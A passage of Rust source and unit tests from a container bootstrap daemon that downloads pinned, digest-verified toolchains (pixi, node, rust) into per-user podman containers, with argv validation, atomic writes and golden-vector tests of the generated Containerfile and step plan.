        set_mode(&dist, MODE_PKGCACHE_DIST)?;
        Ok(())
    }

    /// Host-side mirror probe: an artifact counts as cached only when it is a
    /// regular, non-empty file. Symlinks, directories and partial downloads
    /// are misses (ADR-0007: never follow), so a planted entry costs a
    /// re-download instead of being trusted.
    fn observe_cache(&self, files: &[String]) -> Result<BTreeSet<String>, BootstrapError> {
        let mut cached = BTreeSet::new();
        for file in files {
            let Some(host) = self.tree.pkgcache_artifact(file) else {
                return Err(BootstrapError::Io {
                    context: format!("mirror path for {file:?}"),
                    source: std::io::Error::new(std::io::ErrorKind::InvalidInput, "artifact name"),
                });
            };
            match fs::symlink_metadata(&host) {
                Ok(meta) if meta.is_file() && meta.len() > 0 => {
                    cached.insert(file.clone());
                }
                Ok(_) => {}
                Err(e) if e.kind() == std::io::ErrorKind::NotFound => {}
                Err(source) => {
                    return Err(BootstrapError::Io {
                        context: format!("stat {}", host.display()),
                        source,
                    })
                }
            }
        }
        Ok(cached)
    }

    /// Execute one plan step (env-prefixed argv, piped stdin for writes).
    async fn run_step(
        &self,
        container: &str,
        prefix: &[String],
        step: &BootstrapStep,
        report: &mut BootstrapReport,
    ) -> Result<(), BootstrapError> {
        let label = step.label();
        let mut argv = prefix.to_vec();
        argv.extend(step.argv());
        validate_inner_argv(&argv, prefix.len())?;

        if let BootstrapStep::Publish { file, .. } = step {
            // Best effort: the mirror is a cache. A failure (another UID won
            // the race, or EXDEV) costs the next parcel a download, nothing more.
            let out = self.runtime.exec(container, &argv, None).await?;
            if out.code != 0 {
                report.publish_failures.push(format!(
                    "{file}: exit {} ({})",
                    out.code,
                    out.stderr_lossy().trim()
                ));
            }
            report.steps_executed += 1;
            return Ok(());
        }

        let expect = match step {
            BootstrapStep::Verify { expect_sha256, .. } => Some(expect_sha256.clone()),
            _ => None,
        };
        let out = self.runtime.exec(container, &argv, step.stdin()).await?;
        report.steps_executed += 1;
        if out.code != 0 {
            // A probe is the difference between "installed" and "usable": it
            // gets its own variant so the failure names the tool.
            if let BootstrapStep::Probe { tool, .. } = step {
                return Err(BootstrapError::ProbeFailed {
                    tool: tool.clone(),
                    argv,
                    code: out.code,
                    stderr: out.stderr_lossy(),
                });
            }
            return Err(BootstrapError::StepFailed {
                label,
                argv,
                code: out.code,
                stderr: out.stderr_lossy(),
            });
        }
        match step {
            BootstrapStep::Download { .. } => report.downloads += 1,
            BootstrapStep::Verify { file, .. } => {
                let expected = expect.expect("Verify always carries its pin");
                let actual = parse_digest(&out.stdout_lossy()).ok_or_else(|| {
                    BootstrapError::BadDigestOutput {
                        file: file.clone(),
                        code: out.code,
                        stdout: out.stdout_lossy(),
                        stderr: out.stderr_lossy(),
                    }
                })?;
                if actual != expected {
                    return Err(BootstrapError::DigestMismatch {
                        file: file.clone(),
                        expected,
                        actual,
                    });
                }
                report.verified_artifacts.push(file.clone());
            }
            BootstrapStep::Probe { tool, .. } => {
                report
                    .probes
                    .insert(tool.clone(), out.stdout_lossy().trim().to_owned());
            }
            _ => {}
        }
        Ok(())
    }

    async fn run_probes(
        &self,
        container: &str,
        prefix: &[String],
        plan: &BootstrapPlan,
    ) -> Result<BTreeMap<String, String>, BootstrapError> {
        let mut probes = BTreeMap::new();
        for (tool, argv) in plan.probes() {
            let mut full = prefix.to_vec();
            full.extend(argv.clone());
            validate_inner_argv(&full, prefix.len())?;
            let out = self.runtime.exec(container, &full, None).await?;
            if out.code != 0 {
                return Err(BootstrapError::ProbeFailed {
                    tool,
                    argv: full,
                    code: out.code,
                    stderr: out.stderr_lossy(),
                });
            }
            probes.insert(tool, out.stdout_lossy().trim().to_owned());
        }
        Ok(probes)
    }

    /// `cat` a home file; `None` when it does not exist (non-zero exit).
    async fn read_home(
        &self,
        container: &str,
        prefix: &[String],
        path: &str,
    ) -> Result<Option<String>, BootstrapError> {
        let mut argv = prefix.to_vec();
        argv.extend(cat_argv(path));
        validate_inner_argv(&argv, prefix.len())?;
        let out = self.runtime.exec(container, &argv, None).await?;
        if out.code != 0 {
            return Ok(None);
        }
        Ok(Some(out.stdout_lossy()))
    }

    /// Digest a home file in-container (the daemon's host user cannot read a
    /// 0700 subuid-owned home — ADR-0011).
    async fn digest(
        &self,
        container: &str,
        prefix: &[String],
        path: &str,
    ) -> Result<String, BootstrapError> {
        let mut argv = prefix.to_vec();
        argv.extend(vec![DIGEST_TOOL.to_owned(), path.to_owned()]);
        validate_inner_argv(&argv, prefix.len())?;
        let out = self.runtime.exec(container, &argv, None).await?;
        if out.code != 0 {
            return Err(BootstrapError::BadDigestOutput {
                file: path.to_owned(),
                code: out.code,
                stdout: out.stdout_lossy(),
                stderr: out.stderr_lossy(),
            });
        }
        parse_digest(&out.stdout_lossy()).ok_or(BootstrapError::BadDigestOutput {
            file: path.to_owned(),
            code: out.code,
            stdout: out.stdout_lossy(),
            stderr: out.stderr_lossy(),
        })
    }

    /// Append the baseline entry to the parcel's DEED.md unless that exact
    /// manifest digest is already recorded. Returns `true` when appended.
    /// Atomic (temp + fsync + rename, ADR-0006): DEED.md is daemon-owned
    /// 0644, so this is a host-side write.
    fn record_deed_baseline(
        &self,
        uid: u32,
        plan: &BootstrapPlan,
        manifest_sha256: &str,
    ) -> Result<bool, BootstrapError> {
        let path = self.tree.parcel_deed(uid);
        match fs::symlink_metadata(&path) {
            Ok(meta) if meta.file_type().is_file() => {}
            Ok(_) => return Err(BootstrapError::NotRegularFile { path }),
            Err(source) => {
                return Err(BootstrapError::Io {
                    context: format!("stat {}", path.display()),
                    source,
                })
            }
        }
        let deed =
            fs::read_to_string(&path).map_err(io_err(&format!("read {}", path.display())))?;
        if deed_has_baseline(&deed, uid, manifest_sha256) {
            return Ok(false);
        }
        if !deed
            .lines()
            .any(|line| line.trim_end() == DEED_ALTERATIONS_HEADING)
        {
            return Err(BootstrapError::DeedMalformed { path });
        }
        let entry = deed_baseline_entry(uid, plan, manifest_sha256);
        // The heading is the last block of the stub, so the entry appends
        // inside it; ensure exactly one separating newline.
        let mut updated = deed.clone();
        if !updated.ends_with('\n') {
            updated.push('\n');
        }
        updated.push_str(&entry);
        atomic_write(&path, &updated)?;
        Ok(true)
    }
}

/// Parse `<64 hex>  <path>` (or `… *<path>` for binary mode) into the digest.
fn parse_digest(stdout: &str) -> Option<String> {
    let token = stdout.lines().next()?.split_whitespace().next()?;
    if token.len() == 64
        && token
            .bytes()
            .all(|b| b.is_ascii_hexdigit() && !b.is_ascii_uppercase())
    {
        Some(token.to_owned())
    } else {
        None
    }
}

/// Guard the composed in-container argv: no empty/control args, and the inner
/// command (the first element after the `env K=V …` prefix) must not start
/// with `-`, or `env` would read it as an option.
fn validate_inner_argv(argv: &[String], prefix_len: usize) -> Result<(), BootstrapError> {
    for arg in argv {
        if arg.is_empty() || arg.chars().any(char::is_control) {
            return Err(BootstrapError::StepFailed {
                label: "argv validation".to_owned(),
                argv: argv.to_vec(),
                code: -1,
                stderr: format!("argument {arg:?} is empty or contains control characters"),
            });
        }
    }
    if let Some(inner) = argv.get(prefix_len) {
        if inner.starts_with('-') {
            return Err(BootstrapError::StepFailed {
                label: "argv validation".to_owned(),
                argv: argv.to_vec(),
                code: -1,
                stderr: format!("inner command {inner:?} must not start with '-'"),
            });
        }
    }
    Ok(())
}

/// ADR-0006 atomic write: unique temp per attempt in the destination
/// directory → fsync → rename → fsync the directory.
fn atomic_write(path: &Path, content: &str) -> Result<(), BootstrapError> {
    static ATTEMPT: AtomicU64 = AtomicU64::new(0);
    let serial = ATTEMPT.fetch_add(1, Ordering::Relaxed);
    let parent = path
        .parent()
        .ok_or_else(|| BootstrapError::Io {
            context: format!("write {}: no parent directory", path.display()),
            source: std::io::Error::new(std::io::ErrorKind::InvalidInput, "no parent"),
        })?
        .to_path_buf();
    let mut tmp_name = std::ffi::OsString::from(".");
    tmp_name.push(path.file_name().ok_or_else(|| BootstrapError::Io {
        context: format!("write {}: no file name", path.display()),
        source: std::io::Error::new(std::io::ErrorKind::InvalidInput, "no file name"),
    })?);
    tmp_name.push(format!(".{}.{serial}.tmp", std::process::id()));
    let tmp = parent.join(tmp_name);

    let result = (|| -> std::io::Result<()> {
        {
            let mut file = fs::File::create(&tmp)?;
            file.write_all(content.as_bytes())?;
            file.sync_all()?;
        }
        #[cfg(unix)]
        {
            use std::os::unix::fs::PermissionsExt;
            fs::set_permissions(&tmp, fs::Permissions::from_mode(0o644))?;
        }
        fs::rename(&tmp, path)?;
        if let Ok(dir) = fs::File::open(&parent) {
            let _ = dir.sync_all();
        }
        Ok(())
    })();
    if let Err(source) = result {
        let _ = fs::remove_file(&tmp);
        return Err(BootstrapError::Io {
            context: format!("atomic write {}", path.display()),
            source,
        });
    }
    Ok(())
}

// ---------------------------------------------------------------------------
// Test support
// ---------------------------------------------------------------------------

/// Script a [`crate::podman::FakeRuntime`] so every pinned artifact verifies
/// and the manifest/profile digests answer: `sha256sum <staged path>` →
/// the pin digest, `sha256sum <home file>` → `home_file_digest`.
///
/// Test-support in the lib by the same precedent as
/// [`crate::podman::FakeRuntime`] itself — it keeps the fake generic (no
/// bootstrap-specific branching inside it) while letting integration tests
/// drive a full bootstrap flow.
///
/// # Panics
///
/// Panics when `home_file_digest` is not 64 lowercase hex (a test bug).
pub fn script_pinned_digests(
    runtime: &crate::podman::FakeRuntime,
    uid: u32,
    pins: &ToolchainPins,
    home_file_digest: &str,
) {
    use crate::podman::ExecOutput;
    assert_eq!(
        parse_digest(home_file_digest).as_deref(),
        Some(home_file_digest),
        "home_file_digest must be 64 lowercase hex"
    );
    let output = |digest: &str, path: &str| ExecOutput {
        code: 0,
        stdout: format!("{digest}  {path}\n").into_bytes(),
        stderr: Vec::new(),
    };
    for tool in pins.tools() {
        for artifact in tool.artifacts() {
            let path = staged_path(uid, artifact.file());
            runtime.script_exec_for(
                format!("{DIGEST_TOOL} {path}"),
                output(artifact.sha256(), &path),
            );
        }
    }
    for path in [manifest_path(uid), profile_path(uid)] {
        runtime.script_exec_for(
            format!("{DIGEST_TOOL} {path}"),
            output(home_file_digest, &path),
        );
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use hamlet_core::blueprint::Blueprint;
    use hamlet_core::sanitize::sanitize_name;

    const UID: u32 = 1001;

    fn tree() -> HamletTree {
        HamletTree::new("/village/.hamlet")
    }

    fn blueprint() -> Blueprint {
        Blueprint::default_village_alpine().expect("committed default blueprint parses")
    }

    fn pins() -> ToolchainPins {
        ToolchainPins::default_hamlet().expect("committed pin table parses")
    }

    fn cold_plan() -> BootstrapPlan {
        plan_bootstrap(UID, &blueprint(), &pins(), &BTreeSet::new()).expect("default plan")
    }

    fn warm_plan() -> BootstrapPlan {
        let files: BTreeSet<String> = artifact_files(&blueprint(), &pins())
            .expect("files")
            .into_iter()
            .collect();
        plan_bootstrap(UID, &blueprint(), &pins(), &files).expect("warm plan")
    }

    fn labels(plan: &BootstrapPlan) -> Vec<String> {
        plan.steps.iter().map(BootstrapStep::label).collect()
    }

    fn blueprint_with_env(env: &str) -> Blueprint {
        Blueprint::from_toml(&format!(
            r#"
[meta]
name = "env-probe"
version = 3
base_image = "docker.io/library/alpine:3.24"

[[tools]]
kind = "pixi"
name = "pixi"
version_spec = "0.34.*"

[env]
{env}
"#
        ))
        .expect("probe blueprint must parse (core validates charset/secrets first)")
    }

    // -----------------------------------------------------------------------
    // Image policy (ADR-0012 cl. 1–2)
    // -----------------------------------------------------------------------

    /// Golden vector: the generated Containerfile — parent from `[meta]`,
    /// apk union sorted/deduped, and NO init system of any kind.
    #[test]
    fn containerfile_golden() {
        assert_eq!(
            containerfile(&blueprint()),
            "# hamlet derived parcel image — GENERATED by hamlet-daemon bootstrap.\n\
             # blueprint: village-alpine v1 · parent: docker.io/library/alpine:3.24 · apk floor: v2\n\
             # Rebuilt only when this file's fingerprint leaves the tag (ADR-0012 cl. 2).\n\
             # No init system: the daemon supplies the slim keep-alive at run\n\
             # (SPEC §4 — no systemd-class init).\n\
             # ENTRYPOINT/CMD are explicitly CLEARED, not merely omitted (ADR-0024):\n\
             # the parent image may declare a body (alpine:3.24 ships CMD [\"/bin/sh\"]),\n\
             # and an inherited one would silently become a parcel's process.\n\
             FROM docker.io/library/alpine:3.24\n\
             RUN apk add --no-cache acl ca-certificates curl git gzip libgcc libstdc++ tar uutils-coreutils xz\n\
             ENTRYPOINT []\n\
             CMD []\n\
"
        );
        // The INSTRUCTION set (comments stripped) is exactly four lines: no
        // init system, no USER (the run argv sets `--user <uid>`), no
        // ADD/COPY (nothing host-side is baked in — the home is a bind mount),
        // and both ENTRYPOINT and CMD explicitly cleared to empty so no parent
        // body can be inherited (ADR-0024, QA04-06).
        let cf = containerfile(&blueprint());
        let instructions: Vec<&str> = cf
            .lines()
            .filter(|l| !l.trim_start().starts_with('#') && !l.trim().is_empty())
            .collect();
        assert_eq!(
            instructions,
            [
                "FROM docker.io/library/alpine:3.24",
                "RUN apk add --no-cache acl ca-certificates curl git gzip libgcc libstdc++ tar uutils-coreutils xz",
                "ENTRYPOINT []",
                "CMD []"
            ]
        );
        // No instruction sets a body that the daemon did not supply: the only
        // CMD/ENTRYPOINT lines are the empty resets.
        for line in instructions {
            assert!(
                line == "CMD []"
                    || line == "ENTRYPOINT []"
                    || !line.starts_with("CMD") && !line.starts_with("ENTRYPOINT"),
                "unexpected body instruction: {line}"
            );
        }
    }

    /// QA04-06 regression: the derived image must not inherit a body from its
    /// parent. `alpine:3.24` upstream declares `CMD ["/bin/sh"]`, so "no CMD
    /// line" was never sufficient — the golden above proves we emit the
    /// explicit resets. This asserts the *intent* independently of the exact
    /// golden text, so a future Containerfile rewrite can't quietly drop them.
    #[test]
    fn containerfile_always_clears_entrypoint_and_cmd() {
        let cf = containerfile(&blueprint());
        assert!(
            cf.lines().any(|l| l.trim() == "CMD []"),
            "no CMD reset — a parent CMD (alpine ships /bin/sh) would be inherited"
        );
        assert!(
            cf.lines().any(|l| l.trim() == "ENTRYPOINT []"),
            "no ENTRYPOINT reset — a parent entrypoint would wrap every parcel body"
        );
        assert!(
            !cf.lines().any(|l| l.starts_with("USER")),
            "USER in the image would pre-empt the run argv's --user <uid>"
        );
        assert!(
            !cf.lines()
                .any(|l| l.starts_with("ADD") || l.starts_with("COPY")),
            "host-side content must never be baked into the image"
        );
    }

    /// QA04-05 regression: the apk set carries the shared libraries the pinned
    /// musl toolchain artifacts dynamically need. Dropping either one makes
    /// every parcel's node probe die at the loader with exit 127.
    #[test]
    fn floor_carries_the_musl_runtime_libraries() {
        let pkgs = apk_packages(&blueprint());
        for needed in ["libgcc", "libstdc++"] {
            assert!(
                pkgs.iter().any(|p| p == needed),
                "floor is missing {needed}: pinned musl `node` has it in DT_NEEDED \
                 and alpine ships neither (QA04-05)"
            );
        }
        // They are floor (daemon) packages, not blueprint policy: a promoted
        // blueprint must not be able to drop them by omission.
        assert!(BOOTSTRAP_FLOOR.contains(&"libgcc"));
        assert!(BOOTSTRAP_FLOOR.contains(&"libstdc++"));
        // Floor v2 is what makes them part of the image tag: the bump is what
        // forces a rebuild of every already-built v1 parcel image.
        assert_eq!(FLOOR_VERSION, 2);
    }

    /// The apk set is the sorted union of blueprint tools and the floor —
    /// duplicates collapse, and the floor's GNU tar/xz are always present.
    #[test]
    fn apk_packages_are_the_sorted_floor_union() {
        let pkgs = apk_packages(&blueprint());
        assert_eq!(
            pkgs,
            [
                "acl",
                "ca-certificates",
                "curl",
                "git",
                "gzip",
                "libgcc",
                "libstdc++",
                "tar",
                "uutils-coreutils",
                "xz"
            ]
        );
        // curl + ca-certificates are declared by the blueprint AND the floor:
        // deduped, never installed twice.
        assert_eq!(pkgs.iter().filter(|p| *p == "curl").count(), 1);
        for floor in BOOTSTRAP_FLOOR {
            assert!(pkgs.contains(&floor.to_owned()), "floor package {floor}");
        }
    }

    /// The derived tag is a content fingerprint: stable for identical input,
    /// different for any change to the image definition.
    #[test]
    fn derived_tag_fingerprints_the_containerfile() {
        let bp = blueprint();
        assert_eq!(
            derived_image_tag(&bp),
            format!(
                "localhost/hamlet/village-alpine:v1-f{FLOOR_VERSION}-c{:016x}",
                fnv1a64(containerfile(&bp).as_bytes())
            )
        );
        assert_eq!(derived_image_tag(&bp), derived_image_tag(&bp));
        assert!(
            derived_image_tag(&bp).starts_with("localhost/"),
            "localhost/-scoped: podman never resolves it against a registry"
        );
        // A different parent or apk set changes the fingerprint (no stale tag
        // can ever serve a changed image definition).
        let other = Blueprint::from_toml(
            r#"
[meta]
name = "village-alpine"
version = 1
base_image = "docker.io/library/alpine:3.23"
"#,
        )
        .unwrap();
        assert_ne!(derived_image_tag(&other), derived_image_tag(&bp));
        // A blueprint version bump changes the tag even with identical content.
        let bumped = Blueprint::from_toml(
            r#"
[meta]
name = "village-alpine"
version = 2
base_image = "docker.io/library/alpine:3.24"
"#,
        )
        .unwrap();
        assert_ne!(derived_image_tag(&bumped), derived_image_tag(&bp));
        // Uppercase blueprint names are lowercased (image refs must be).
        let upper = Blueprint::from_toml(
            r#"
[meta]
name = "Village-Alpine"
version = 1
base_image = "docker.io/library/alpine:3.24"
"#,
        )
        .unwrap();
        assert!(derived_image_tag(&upper).contains("/village-alpine:"));
    }

    /// FNV-1a golden vectors (dependency-free fingerprint).
    #[test]
    fn fnv1a64_golden_vectors() {
        assert_eq!(fnv1a64(b""), 0xcbf2_9ce4_8422_2325);
        assert_eq!(fnv1a64(b"a"), 0xaf63_dc4c_8601_ec8c);
        assert_eq!(fnv1a64(b"foobar"), 0x8594_4171_f739_67e8);
    }

    /// Adversarial: the build context must never live where an agent UID can
    /// write — a writable Containerfile IS the container's root filesystem.
    #[test]
    fn build_context_is_never_inside_the_village_tree() {
        let t = tree();
        let ctx = build_context_dir(&t, &blueprint());
        assert!(!ctx.starts_with(t.root()), "outside the tree: {ctx:?}");
        assert!(!ctx.starts_with(t.market_pkgcache()), "never in pkgcache");
        assert!(ctx.starts_with(std::env::temp_dir()));
        // Two villages on one host get distinct contexts.
        let other = HamletTree::new("/other/.hamlet");
        assert_ne!(
            build_context_dir(&other, &blueprint()),
            ctx,
            "the village root is part of the context identity"
        );
    }

    // -----------------------------------------------------------------------
    // Plan goldens
    // -----------------------------------------------------------------------

    /// Golden vector: the complete cold-cache step sequence for the committed
    /// default blueprint (7 artifacts, 3 multiplexers, 42 steps).
    #[test]
    fn cold_plan_step_sequence_golden() {
        let plan = cold_plan();
        assert_eq!(
            labels(&plan),
            [
                "mkdir /home/1001/.hamlet /home/1001/.hamlet/stage",
                "chmod 0700 /home/1001/.hamlet/stage",
                // --- pixi ---
                "mkdir /home/1001/.pixi/bin",
                "download pixi-0.34.0-x86_64-unknown-linux-musl.tar.gz",
                "verify pixi-0.34.0-x86_64-unknown-linux-musl.tar.gz",
                "chmod 0644 /home/1001/.hamlet/stage/pixi-0.34.0-x86_64-unknown-linux-musl.tar.gz",
                "publish pixi-0.34.0-x86_64-unknown-linux-musl.tar.gz",
                "extract pixi-0.34.0-x86_64-unknown-linux-musl.tar.gz → /home/1001/.pixi/bin",
                "probe pixi",
                // --- nvm + node ---
                "mkdir /home/1001/.nvm /home/1001/.nvm/versions/node/v22.23.3",
                "download nvm-0.40.8.tar.gz",
                "verify nvm-0.40.8.tar.gz",
                "chmod 0644 /home/1001/.hamlet/stage/nvm-0.40.8.tar.gz",
                "publish nvm-0.40.8.tar.gz",
                "extract nvm-0.40.8.tar.gz → /home/1001/.nvm",
                "download node-v22.23.3-linux-x64-musl.tar.xz",
                "verify node-v22.23.3-linux-x64-musl.tar.xz",
                "chmod 0644 /home/1001/.hamlet/stage/node-v22.23.3-linux-x64-musl.tar.xz",
                "publish node-v22.23.3-linux-x64-musl.tar.xz",
                "extract node-v22.23.3-linux-x64-musl.tar.xz → /home/1001/.nvm/versions/node/v22.23.3",
                "probe node",
                // --- rustup + rust ---
                "mkdir /home/1001/.cargo/bin /home/1001/.rustup /home/1001/.rust/toolchains/hamlet-1.98.1",
                "download rustup-init-x86_64-unknown-linux-musl",
                "verify rustup-init-x86_64-unknown-linux-musl",
                "chmod 0755 /home/1001/.hamlet/stage/rustup-init-x86_64-unknown-linux-musl",
                "publish rustup-init-x86_64-unknown-linux-musl",
                "rustup-init (multiplexer only, no toolchain download)",
                "download rustc-1.98.1-x86_64-unknown-linux-musl.tar.xz",
                "verify rustc-1.98.1-x86_64-unknown-linux-musl.tar.xz",
                "chmod 0644 /home/1001/.hamlet/stage/rustc-1.98.1-x86_64-unknown-linux-musl.tar.xz",
                "publish rustc-1.98.1-x86_64-unknown-linux-musl.tar.xz",
                "extract rustc-1.98.1-x86_64-unknown-linux-musl.tar.xz → /home/1001/.rust/toolchains/hamlet-1.98.1",
                "download cargo-1.98.1-x86_64-unknown-linux-musl.tar.xz",
                "verify cargo-1.98.1-x86_64-unknown-linux-musl.tar.xz",
                "chmod 0644 /home/1001/.hamlet/stage/cargo-1.98.1-x86_64-unknown-linux-musl.tar.xz",
                "publish cargo-1.98.1-x86_64-unknown-linux-musl.tar.xz",
                "extract cargo-1.98.1-x86_64-unknown-linux-musl.tar.xz → /home/1001/.rust/toolchains/hamlet-1.98.1",
                "download rust-std-1.98.1-x86_64-unknown-linux-musl.tar.xz",
                "verify rust-std-1.98.1-x86_64-unknown-linux-musl.tar.xz",
                "chmod 0644 /home/1001/.hamlet/stage/rust-std-1.98.1-x86_64-unknown-linux-musl.tar.xz",
                "publish rust-std-1.98.1-x86_64-unknown-linux-musl.tar.xz",
                "extract rust-std-1.98.1-x86_64-unknown-linux-musl.tar.xz → /home/1001/.rust/toolchains/hamlet-1.98.1",
                "rustup toolchain link hamlet-1.98.1",
                "rustup default hamlet-1.98.1",
                "probe rust",
                // --- finish ---
                "drop private staging",
                "write /home/1001/.profile",
                "write /home/1001/.hamlet/toolchain.json",
            ]
            .iter()
            .map(|s| (*s).to_owned())
            .collect::<Vec<_>>()
        );
        assert_eq!((plan.cache_hits, plan.cache_misses), (0, 7));
        assert_eq!(plan.steps.iter().filter(|s| s.is_download()).count(), 7);
    }

    /// Golden argv for the representative step shapes.
    #[test]
    fn step_argv_goldens() {
        let plan = cold_plan();
        let argv_of = |label: &str| -> Vec<String> {
            plan.steps
                .iter()
                .find(|s| s.label() == label)
                .unwrap_or_else(|| panic!("no step {label:?}"))
                .argv()
        };
        assert_eq!(
            argv_of("download nvm-0.40.8.tar.gz"),
            [
                "curl",
                "-fsSL",
                "--retry",
                "3",
                "-o",
                "/home/1001/.hamlet/stage/nvm-0.40.8.tar.gz",
                "https://github.com/nvm-sh/nvm/archive/refs/tags/v0.40.8.tar.gz"
            ]
        );
        assert!(
            !plan
                .steps
                .iter()
                .any(|s| matches!(s, BootstrapStep::StageFromCache { .. })),
            "a cold plan never stages from the mirror"
        );
        assert_eq!(
            argv_of("verify nvm-0.40.8.tar.gz"),
            ["sha256sum", "/home/1001/.hamlet/stage/nvm-0.40.8.tar.gz"]
        );
        assert_eq!(
            argv_of("publish nvm-0.40.8.tar.gz"),
            [
                "ln",
                "/home/1001/.hamlet/stage/nvm-0.40.8.tar.gz",
                "/var/pkgcache/dist/nvm-0.40.8.tar.gz"
            ],
            "hard link, not cp: ln refuses an existing name instead of following it"
        );
        assert_eq!(
            argv_of("extract nvm-0.40.8.tar.gz → /home/1001/.nvm"),
            [
                "tar",
                "-x",
                "-z",
                "-f",
                "/home/1001/.hamlet/stage/nvm-0.40.8.tar.gz",
                "-C",
                "/home/1001/.nvm",
                "--strip-components",
                "1"
            ]
        );
        assert_eq!(
            argv_of("rustup-init (multiplexer only, no toolchain download)"),
            [
                "/home/1001/.hamlet/stage/rustup-init-x86_64-unknown-linux-musl",
                "-y",
                "--no-modify-path",
                "--default-toolchain",
                "none"
            ],
            "never lets rustup fetch an unpinned toolchain"
        );
        assert_eq!(
            argv_of("rustup toolchain link hamlet-1.98.1"),
            [
                "/home/1001/.cargo/bin/rustup",
                "toolchain",
                "link",
                "hamlet-1.98.1",
                "/home/1001/.rust/toolchains/hamlet-1.98.1"
            ]
        );
        assert_eq!(
            argv_of("probe pixi"),
            ["/home/1001/.pixi/bin/pixi", "--version"]
        );
        assert_eq!(
            argv_of("probe node"),
            [
                "/home/1001/.nvm/versions/node/v22.23.3/bin/node",
                "--version"
            ]
        );
        assert_eq!(
            argv_of("probe rust"),
            ["/home/1001/.cargo/bin/cargo", "--version"]
        );
        assert_eq!(
            argv_of("write /home/1001/.profile"),
            ["tee", "/home/1001/.profile"]
        );
        assert_eq!(
            argv_of("drop private staging"),
            ["rm", "-r", "-f", "/home/1001/.hamlet/stage"]
        );
        // Writes pipe their content on stdin (the home is 0700 subuid-owned,
        // so the daemon can only write it from inside the container).
        let write = plan
            .steps
            .iter()
            .find(|s| matches!(s, BootstrapStep::Write { .. }))
            .unwrap();
        assert!(write.stdin().is_some());
        assert_eq!(
            String::from_utf8_lossy(write.stdin().unwrap()),
            plan.profile
        );
    }

    /// A warm mirror turns every download into a local copy: zero network
    /// steps, same install semantics (this is what makes re-provisioning
    /// offline-friendly).
    #[test]
    fn warm_mirror_plan_downloads_nothing() {
        let plan = warm_plan();
        assert_eq!((plan.cache_hits, plan.cache_misses), (7, 0));
        assert!(
            !plan.steps.iter().any(|s| s.is_download()),
            "no curl step when every artifact is mirrored"
        );
        assert!(
            !plan
                .steps
                .iter()
                .any(|s| matches!(s, BootstrapStep::Publish { .. })),
            "a cache hit is never re-published"
        );
        let stages: Vec<Vec<String>> = plan
            .steps
            .iter()
            .filter(|s| matches!(s, BootstrapStep::StageFromCache { .. }))
            .map(BootstrapStep::argv)
            .collect();
        assert_eq!(stages.len(), 7);
        assert_eq!(
            stages[0],
            [
                "cp",
                "/var/pkgcache/dist/pixi-0.34.0-x86_64-unknown-linux-musl.tar.gz",
                "/home/1001/.hamlet/stage/pixi-0.34.0-x86_64-unknown-linux-musl.tar.gz"
            ]
        );
        // Verification is NOT skipped just because the bytes came from cache —
        // the mirror is world-writable (ADR-0013 cl. 1).
        assert_eq!(
            plan.steps
                .iter()
                .filter(|s| matches!(s, BootstrapStep::Verify { .. }))
                .count(),
            7
        );
        // The desired state is identical, so a warm parcel converges to the
        // same manifest/profile bytes as a cold one.
        assert_eq!(plan.manifest, cold_plan().manifest);
        assert_eq!(plan.profile, cold_plan().profile);
    }

    /// The plan is a pure function of its inputs: identical bytes every time
    /// (the byte-comparison the verified no-op relies on).
    #[test]
    fn plan_is_deterministic() {
        let a = cold_plan();
        let b = cold_plan();
        assert_eq!(a, b);
        assert_eq!(a.manifest, b.manifest);
        assert_eq!(a.profile, b.profile);
        // …and it tracks the uid (homes are per-slot).
        let other = plan_bootstrap(1002, &blueprint(), &pins(), &BTreeSet::new()).unwrap();
        assert_ne!(other.manifest, a.manifest);
        assert!(other.profile.contains("/home/1002"));
    }

    /// Every artifact is staged privately and digest-verified BEFORE anything
    /// extracts, executes, or publishes it (ADR-0013 cl. 2 ordering).
    #[test]
    fn every_artifact_is_verified_before_it_is_used() {
        let plan = cold_plan();
        for tool in &plan.tools {
            for artifact in &tool.artifacts {
                let file = &artifact.file;
                let idx = |pred: &dyn Fn(&BootstrapStep) -> bool| -> Option<usize> {
                    plan.steps.iter().position(pred)
                };
                let staged_at = idx(&|s| match s {
                    BootstrapStep::Download { file: f, .. }
                    | BootstrapStep::StageFromCache { file: f, .. } => f == file,
                    _ => false,
                })
                .unwrap_or_else(|| panic!("no stage step for {file}"));
                let verified_at =
                    idx(&|s| matches!(s, BootstrapStep::Verify { file: f, .. } if f == file))
                        .unwrap_or_else(|| panic!("no verify step for {file}"));
                assert_eq!(
                    verified_at,
                    staged_at + 1,
                    "verification immediately follows staging for {file}"
                );
                // Nothing may consume the artifact before its digest matched.
                let consumed_at = plan.steps.iter().position(|s| match s {
                    BootstrapStep::Extract { file: f, .. }
                    | BootstrapStep::Publish { file: f, .. } => f == file,
                    BootstrapStep::Chmod { path, .. } => path.contains(file.as_str()),
                    BootstrapStep::Exec { argv, .. } => {
                        argv.iter().any(|a| a.contains(file.as_str()))
                    }
                    _ => false,
                });
                if let Some(at) = consumed_at {
                    assert!(
                        at > verified_at,
                        "{file} is consumed at {at} but verified at {verified_at}"
                    );
                }
                // The pinned digest is what the step carries.
                match &plan.steps[verified_at] {
                    BootstrapStep::Verify {
                        expect_sha256,
                        path,
                        ..
                    } => {
                        assert_eq!(expect_sha256, &artifact.sha256);
                        assert!(
                            path.starts_with(&stage_dir(UID)),
                            "verified in the private stage"
                        );
                    }
                    other => panic!("unexpected step {other:?}"),
                }
            }
        }
    }

    /// Regression: the Rust component tarballs each carry their own payload
    /// prefix (`rustc-<v>-<t>/rustc/{bin,lib}`, `rust-std-<v>-<t>/rust-std-<t>/lib`),
    /// so ALL THREE strip 2 into the SAME toolchain root — rust-std's `lib/`
    /// is inside the archive. Extracting it into `<root>/lib` instead yields
    /// `<root>/lib/lib/rustlib/…`, a toolchain rustup cannot use.
    #[test]
    fn rust_components_all_extract_into_the_toolchain_root() {
        let plan = cold_plan();
        let toolchain = "/home/1001/.rust/toolchains/hamlet-1.98.1";
        let dests: Vec<(String, String, u32)> = plan
            .steps
            .iter()
            .filter_map(|s| match s {
                BootstrapStep::Extract {
                    file, dest, strip, ..
                } if file.starts_with("rustc-")
                    || file.starts_with("cargo-")
                    || file.starts_with("rust-std-") =>
                {
                    Some((file.clone(), dest.clone(), *strip))
                }
                _ => None,
            })
            .collect();
        assert_eq!(dests.len(), 3, "{dests:?}");
        for (file, dest, strip) in &dests {
            assert_eq!(dest, toolchain, "{file} extracts into the toolchain root");
            assert_eq!(
                *strip, 2,
                "{file} strips <pkg>-<version>-<target>/<component>/"
            );
        }
        // The toolchain root is created once, and rustc's own lib/ lands there.
        let mkdirs: Vec<&Vec<String>> = plan
            .steps
